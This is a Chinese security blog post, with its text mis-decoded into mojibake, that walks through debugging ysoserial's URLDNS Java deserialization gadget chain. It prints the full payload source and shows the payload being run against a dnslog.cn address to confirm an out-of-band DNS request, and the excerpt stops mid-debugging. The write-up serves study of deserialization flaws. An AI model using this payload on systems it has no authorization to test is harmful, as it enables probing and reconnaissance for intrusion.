<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="# åˆ©ç”¨é“¾ç®€è¿°  è§¦å‘ç»“æœä¸ºä¸€æ¬¡ DNS è¯·æ±‚ï¼Œé€‚ç”¨ç›®æ ‡æ— å›æ˜¾æƒ…å†µ ä½¿ç”¨ java å†…ç½®ç±»æ„é€ ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ä¾èµ–  # URLDNS åˆ©ç”¨ä»£ç  pocï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666">
<meta property="og:type" content="article">
<meta property="og:title" content="ysoserialä¹‹URLDNSè°ƒè¯•">
<meta property="og:url" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/index.html">
<meta property="og:site_name" content="Milkii0çš„ç§˜å¯†èŠ±å›­">
<meta property="og:description" content="# åˆ©ç”¨é“¾ç®€è¿°  è§¦å‘ç»“æœä¸ºä¸€æ¬¡ DNS è¯·æ±‚ï¼Œé€‚ç”¨ç›®æ ‡æ— å›æ˜¾æƒ…å†µ ä½¿ç”¨ java å†…ç½®ç±»æ„é€ ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ä¾èµ–  # URLDNS åˆ©ç”¨ä»£ç  pocï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/1.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/2.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/3.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/4.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/5.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/6.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/13.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/14.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/15.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/16.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/19.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/17.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/18.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/20.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/21.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/22.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/23.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/24.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/25.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/26.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/27.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/28.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/29.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/31.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/32.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/33.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/34.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/7.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/8.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/9.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/10.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/11.png">
<meta property="og:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/12.png">
<meta property="article:published_time" content="2021-08-25T03:38:45.000Z">
<meta property="article:modified_time" content="2021-09-08T01:40:52.339Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ysoserialè°ƒè¯•">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ysoserialä¹‹URLDNSè°ƒè¯•</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Milkii0çš„ç§˜å¯†èŠ±å›­" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&text=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&is_video=false&description=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ysoserialä¹‹URLDNSè°ƒè¯•&body=Check out this article: http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&name=ysoserialä¹‹URLDNSè°ƒè¯•&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&t=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text"> åˆ©ç”¨é“¾ç®€è¿°</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#urldns%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text"> URLDNS åˆ©ç”¨ä»£ç </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text"> è°ƒè¯•åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%B0%9D%E8%AF%95"><span class="toc-number">3.1.</span> <span class="toc-text"> è¿è¡Œå°è¯•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text"> ä»£ç è°ƒè¯•</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text"> æ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%9C%AA%E8%A7%A3%E5%86%B3"><span class="toc-number">4.1.</span> <span class="toc-text"> è°ƒè¯•é‡åˆ°çš„é—®é¢˜ï¼ˆæœªè§£å†³ï¼‰</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ysoserialä¹‹URLDNSè°ƒè¯•
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-08-25T03:38:45.000Z" itemprop="datePublished">2021-08-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/ysoserial%E8%B0%83%E8%AF%95/" rel="tag">ysoserialè°ƒè¯•</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="åˆ©ç”¨é“¾ç®€è¿°"><a class="markdownIt-Anchor" href="#åˆ©ç”¨é“¾ç®€è¿°">#</a> åˆ©ç”¨é“¾ç®€è¿°</h1>
<ol>
<li>è§¦å‘ç»“æœä¸ºä¸€æ¬¡ DNS è¯·æ±‚ï¼Œé€‚ç”¨ç›®æ ‡æ— å›æ˜¾æƒ…å†µ</li>
<li>ä½¿ç”¨ java å†…ç½®ç±»æ„é€ ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ä¾èµ–</li>
</ol>
<h1 id="urldnsåˆ©ç”¨ä»£ç "><a class="markdownIt-Anchor" href="#urldnsåˆ©ç”¨ä»£ç ">#</a> URLDNS åˆ©ç”¨ä»£ç </h1>
<p>pocï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<h1 id="è°ƒè¯•åˆ†æ"><a class="markdownIt-Anchor" href="#è°ƒè¯•åˆ†æ">#</a> è°ƒè¯•åˆ†æ</h1>
<p>é¡¹ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>
<p>æ‰“å¼€ ideaï¼Œæ‰¾åˆ° URLDNS å…¥å£ï¼šysosertial-&gt;src-&gt;main-&gt;java-&gt;ysoserial-&gt;payloads-&gt;URLDNS.java-&gt;main ()</p>
<h2 id="è¿è¡Œå°è¯•"><a class="markdownIt-Anchor" href="#è¿è¡Œå°è¯•">#</a> è¿è¡Œå°è¯•</h2>
<p>ç›´æ¥è¿è¡Œ main å‡½æ•°ï¼Œå‘ç°é»˜è®¤ä¼ å…¥çš„å‘½ä»¤ä¸º calc.exe</p>
<p>æŠ¥é”™ï¼šURL åˆå§‹åŒ–å¤±è´¥ï¼Œæ‰¾ä¸åˆ° calc.exe åè®®</p>
<p><img src="1.png" alt=""></p>
<p>æœ€åä¸€è¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ main å‡½æ•°ï¼Œå€’æ•°ç¬¬äºŒè¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ PayloadRunner</p>
<p>è¯´æ˜ä¸ºä¼ å…¥å‚æ•° args æœ‰è¯¯ï¼Œåº”ä¸º URLï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦å‘é€è¯·æ±‚çš„åœ°å€</p>
<p>æ‰“å¼€ dnslogï¼Œè·å–åˆ°åœ°å€ä¸ºï¼š<a target="_blank" rel="noopener" href="http://ghtzjz.dnslog.cn">ghtzjz.dnslog.cn</a></p>
<p><img src="2.png" alt=""></p>
<p>ç¼–è¾‘ä¼ å…¥å‚æ•°ï¼Œ<a target="_blank" rel="noopener" href="http://ghtzjz.dnslog.cn">http://ghtzjz.dnslog.cn</a></p>
<p><img src="3.png" alt=""></p>
<p><img src="4.png" alt=""></p>
<p>å†æ¬¡è¿è¡Œ main ()ï¼Œpayload ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°</p>
<p><img src="5.png" alt=""></p>
<p>åˆ·æ–° dnslog çš„è¯·æ±‚è®°å½•ï¼Œå‘ç°æ¥æ”¶åˆ°äº†è¯·æ±‚ï¼Œåˆ©ç”¨æˆåŠŸ</p>
<p><img src="6.png" alt=""></p>
<h2 id="ä»£ç è°ƒè¯•"><a class="markdownIt-Anchor" href="#ä»£ç è°ƒè¯•">#</a> ä»£ç è°ƒè¯•</h2>
<p>æˆ‘ä»¬ä» main å‡½æ•°ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ï¼Œä¼šå‘ç° URLDNS åœ¨ main ä¸­è°ƒç”¨ PayloadRunner#run ()</p>
<p>ç„¶å PayloadRunner#run () ä¸­è°ƒç”¨ URLDNS#getObject ()</p>
<p>URLDNS#getObject () ä¸­çš„ HashMap <strong>ht</strong> å°±æ˜¯æˆ‘ä»¬è¦ç”Ÿæˆçš„ï¼ˆæœªåºåˆ—åŒ–ï¼‰payload</p>
<p><img src="13.png" alt=""></p>
<p>getObeject æ–¹æ³•ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª URL å¯¹è±¡ï¼ˆå­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€ï¼‰â€“&gt; å†å°† URL å¯¹è±¡æ”¾å…¥ HashMap ä¸­</p>
<p>ä¸‹é¢ä¸€è¡Œçš„æ³¨é‡Šå†™é“ï¼Œåœ¨ä¸Šé¢çš„ put è¿‡ç¨‹ä¸­ï¼Œè®¡ç®—å¹¶ç¼“å­˜äº† URL çš„ hashCode; è¿™å°†é‡ç½®å®ƒï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨ hashCode æ—¶å°†è§¦å‘ DNS æŸ¥æ‰¾</p>
<p>é‚£ä¹ˆåœ¨ ht.put æ—¶ï¼Œæˆ‘ä»¬è¿›å…¥ HashMap æŸ¥çœ‹ï¼Œå‘ç° key è¿›è¡Œäº† hash è®¡ç®—</p>
<p>ï¼ˆè¿™é‡Œæ’æ’­ä¸€æ¡å°é“æ¶ˆæ¯ï¼Œç‚¹å‡»è¿™ä¸ªè°ƒè¯•å¯ä»¥è¿”å›ä¸Šä¸€æ­¥<img src="14.png" style="zoom:90%;" />)</p>
<p><img src="15.png" alt=""></p>
<p>åœ¨è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„ URL å¯¹è±¡è¿›è¡Œäº† hash è®¡ç®—</p>
<p>hash è®¡ç®—å‰çš„ URL å¯¹è±¡ï¼š</p>
<p><img src="16.png" alt=""></p>
<p>hash è®¡ç®—åçš„å¯¹è±¡ï¼ˆå°±æ˜¯å¯¹è±¡ä¸­çš„ hashCode å˜é‡å‘ç”Ÿäº†å˜åŒ–å˜›ï¼‰ï¼š</p>
